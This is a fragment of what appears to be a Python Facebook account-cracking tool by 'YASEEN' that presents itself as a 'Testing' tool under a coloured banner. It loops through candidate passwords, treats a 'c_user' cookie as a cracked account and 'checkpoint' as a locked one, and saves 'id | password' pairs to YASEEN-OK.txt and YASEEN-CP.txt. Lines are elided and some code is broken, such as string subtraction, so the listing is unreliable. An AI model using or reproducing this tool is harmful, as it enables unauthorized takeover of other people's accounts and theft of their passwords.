...
\__|  \__| \______/ \__|  \__| \______/ 
                       MR❤YASEEN                                                                                                     
\033[1;33m----------------------------------------------
 \033[1;37mAUTHOR    : \033[1;36mYASEEN🖤KHAN
 \033[1;35mGITHUB    : \033[1;35mYASEEN
 \033[1;39mFACEBOOK  :\033[1;33m YASEEN
 \033[1;36mTOOL NAME :\033[1;34m RANDOM
 \033[1;35mTOOL TYPE : \033[1;37mTesting
 \033[1;32mVERSION   : \033[1;39m2.0
\033[1;33m----------------------------------------------
\033[1;33m----------------------------------------------""")
...
cps = []
try:
    print('\n \n\033[1;32m WELCOME TO YASEEN TOOLS \033[0;97m\n ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('YASEEN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[YASEEN-CP] '-uid-' | '+ps+'\x1b[1;97m')
                open('YASEEN-CP.txt', 'a').write(uid-' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mYASEEN\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
